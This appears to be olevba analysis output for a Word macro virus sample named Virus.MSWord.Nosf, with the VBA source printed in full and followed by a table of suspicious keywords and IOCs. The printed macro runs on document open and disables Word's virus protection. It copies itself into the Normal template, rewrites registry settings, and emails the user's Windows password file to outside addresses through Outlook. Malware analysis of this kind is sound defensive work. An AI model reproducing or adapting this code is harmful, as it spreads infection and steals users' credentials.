olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nosf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nosf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO t35.bas 
in file: Virus.MSWord.Nosf - OLE stream: 'Macros/VBA/t35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
't35
Sub AutoOpen()
On Error Resume Next
'==============+++++++====================================
'=                t35 prodused by Nosferatu              =
'= ____________________give me your time________________ =
'= +++++++++++++++++++++++++++++++++++++++++++++++++++++ =
'= Моя армия велика, мой голос громче других,я Nosferatu =
'=========================================================
DisableAutoMacros = 0
SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
With Application
.EnableCancelKey = True
.ScreenUpdating = False
.ShowVisualBasicEditor = False
End With
With Options
.ConfirmConversions = False
.SaveNormalPrompt = False
.VirusProtection = False
End With
Set ant = CreateObject("WScript.Shell")
Dim wer, dirsystem, dirwin
Set wer = CreateObject("Scripting.FileSystemObject")
Set dirwin = wer.GetSpecialFolder(0)
Set dirsystem = wer.GetSpecialFolder(1)
If Word.Application.MacroContainer = Word.Application.NormalTemplate Then
Set eto = Word.Application.ActiveDocument
Application.NormalTemplate.VBProject.VBComponents("t35").Export dirsystem + "\t35.dll"
GoTo don
End If
Set eto = Word.Application.NormalTemplate
Application.ActiveDocument.VBProject.VBComponents("t35").Export dirsystem + "\t35.dll"
don:
If eto.VBProject.VBComponents("t35").CodeModule.Lines(1, 1) <> "'t35" Then
Word.Application.Options.VirusProtection = vbEmpty
Word.Application.Options.SaveNormalPrompt = vbEmpty
eto.VBProject.VBComponents.Import dirsystem + "\t35.dll"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
Kill dirsystem + "\t35.dll"
look35 = ant.RegRead("HKEY_LOCAL_MACHINE\Security\Network\t35")
If (look35 = "") Then
ant.RegWrite "HKEY_LOCAL_MACHINE\Security\Network\t35", Day(Now) & ":" & Month(Now)
ant.RegWrite "HKEY_LOCAL_MACHINE\Security\Network\counter35", 0
ant.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.ringo82.narod.ru/t35.html"
ant.RegWrite "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName\", "soldier"
ant.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "t35"
ant.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Mephist0pHELL"
ant.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductName", "base35"
uin = ant.RegRead("HKEY_LOCAL_MACHINE\Network\Logon\UserName")
file1 = dirwin + "\" + uin + ".pwl"
Set mybod = Date + "#" + Time + "#" + uin + "--- from t35 macros by Nosferatu" + "http://www.ringo82.narod.ru/t35/hello.html    -----DrWeb, thanks for idea...and for VBS.Dr.Troyan 2.1  -------  with best wishes. Nosferatu."
Set OutLook = WScript.CreateObject("Outlook.Application")
Set mo = OutLook.CreateItem(0)
mo.Recipients.Add ("ringo82@narod.ru")
mo.Recipients.Add ("drweb2k@chat.ru")
mo.Subject = "T35"
mo.Body = mybod
mo.Attachments.Add (file1)
mo.Send
End If
aaa = ant.RegRead("HKEY_LOCAL_MACHINE\Security\Network\counter35")
If aaa > 50 Then
ant.RegWrite "HKEY_LOCAL_MACHINE\Security\Network\t35", ""
End If
tcount = ant.RegRead("HKEY_LOCAL_MACHINE\Security\Network\counter35") + 1
ant.RegWrite "HKEY_LOCAL_MACHINE\Security\Network\counter35", tcount
End Sub
Sub FileTemplates()
On Error Resume Next
ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Sub ViewCode()
On Error Resume Next
ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Sub ViewVBCode()
On Error Resume Next
ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Sub ToolsMacro()
On Error Resume Next
ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
'========================================================
'From Novy Urengoi (Russia) with love...
'MacroVir-t35 - симбиоз нескольких хороших идей.
'
'===========Greets to:===================================
'Dimka, MMX, MC Wizard, Zisem, Scorpy, Macro-vx-scene,
' thanks to DrWeb
'ТюмГУ, Городам: Новый Уренгой, Одесса, Москва, Тюмень.
'===========Fucks to:====================================
'                        ... всем, кто не верит в себя...
'========================================================
'                                               Nosferatu
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.ringo82.n|URL                                          |
|          |arod.ru/t35.html    |                                             |
|IOC       |http://www.ringo82.n|URL                                          |
|          |arod.ru/t35/hello.ht|                                             |
|          |ml                  |                                             |
|IOC       |t35.dll             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

